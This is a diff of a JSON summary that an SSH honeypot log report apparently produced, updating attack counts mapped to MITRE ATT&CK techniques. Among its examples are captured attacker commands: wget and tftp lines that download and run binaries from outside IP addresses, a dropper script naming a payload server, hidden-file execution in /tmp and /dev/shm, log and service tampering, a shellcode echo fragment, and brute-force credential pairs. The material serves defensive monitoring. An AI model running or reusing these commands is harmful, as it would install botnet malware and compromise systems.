@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-26 21:03:17",
+  "generated": "2026-09-26 22:03:50",
   "totals": {
-    "commands": 8795,
-    "login_failed": 7467,
-    "login_success": 837,
-    "sessions": 6767
+    "commands": 8800,
+    "login_failed": 7546,
+    "login_success": 839,
+    "sessions": 6851
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 7467,
+      "count": 7546,
       "examples": [
         "gizelle / gizelle",
         "gizelle / gizelle1",
@@ -21,14 +21,14 @@
         "gizelle / gizelle12345"
       ],
       "first": "2026-09-26T00:00:54.368774Z",
-      "last": "2026-09-26T21:01:45.694804Z",
-      "unique_ips": 134
+      "last": "2026-09-26T22:03:38.470279Z",
+      "unique_ips": 136
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1037,
+      "count": 1038,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,14 +37,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-26T00:13:52.548336Z",
-      "last": "2026-09-26T20:56:22.375638Z",
-      "unique_ips": 59
+      "last": "2026-09-26T21:15:51.062828Z",
+      "unique_ips": 60
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 837,
+      "count": 839,
       "examples": [
         "root / a1sev5y7c39k",
         "root / root",
@@ -53,8 +53,8 @@
         "lghkel\\x09 / zpz}ld\\x09"
       ],
       "first": "2026-09-26T00:10:34.067165Z",
-      "last": "2026-09-26T20:56:20.173753Z",
-      "unique_ips": 103
+      "last": "2026-09-26T21:39:03.277548Z",
+      "unique_ips": 104
     },
     {
       "id": "T1083",
@@ -91,7 +91,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 126,
+      "count": 134,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -100,8 +100,8 @@
         "wget -q -O .r http://201.7.16.231/bins/ouroboros.mips; chmod +x .r; ./.r; rm -f .r"
       ],
       "first": "2026-09-26T00:18:50.025908Z",
-      "last": "2026-09-26T19:35:21.487221Z",
-      "unique_ips": 34
+      "last": "2026-09-26T21:15:54.336009Z",
+      "unique_ips": 35
     },
     {
       "id": "T1033",
@@ -149,28 +149,30 @@
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 12,
+      "count": 13,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a"
       ],
       "first": "2026-09-26T02:53:28.406019Z",
-      "last": "2026-09-26T18:18:25.370950Z",
-      "unique_ips": 12
+      "last": "2026-09-26T21:15:51.062828Z",
+      "unique_ips": 13
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 9,
+      "count": 10,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a"
       ],
       "first": "2026-09-26T02:53:28.406019Z",
-      "last": "2026-09-26T18:09:53.008759Z",
-      "unique_ips": 9
+      "last": "2026-09-26T21:15:51.062828Z",
+      "unique_ips": 10
     },
     {
       "id": "T1059.004",
@@ -239,12 +241,12 @@
       74
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      16
+      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
+      17
     ],
     [
-      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
-      14
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
     ],
     [
       "echo -ne \"\\x41\\x89\\xd4\\x45\\x0f\\xb6\\xe4\\x55\\x53\\x48\\x89\\xcb\\x48\\x83\\xec\\x58\\x40\\x88\\x7c\\x24\\x07\\x40\\x0f\\xb6\\xff\\xe8\\x62\\x",
